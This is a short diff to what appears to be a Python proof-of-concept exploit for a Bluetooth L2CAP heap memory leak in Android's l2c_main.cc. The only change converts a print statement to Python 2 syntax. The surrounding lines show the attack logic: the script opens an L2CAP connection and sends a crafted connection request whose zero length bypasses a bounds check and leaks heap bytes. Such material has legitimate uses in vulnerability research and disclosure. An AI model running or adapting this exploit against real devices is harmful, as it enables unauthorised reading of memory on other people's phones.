@@ -8,7 +8,7 @@ L2CAP_CMD_CONN_REQ = 0x02
 def main(src_hci, dst_bdaddr):
     l2cap_loop, _ = create_l2cap_connection(src_hci, dst_bdaddr)
     # This will leak 2 bytes from the heap
-    print("Sending L2CAP_CMD_CONN_REQ in L2CAP connection...")
+    print "Sending L2CAP_CMD_CONN_REQ in L2CAP connection..."
     cmd_code = L2CAP_CMD_CONN_REQ
     cmd_id = 0x41               # not important
     cmd_len = 0x00              # bypasses this check at lines 296/297 of l2c_main.cc:   p_next_cmd = p + cmd_len; / if (p_next_cmd > p_pkt_end) {
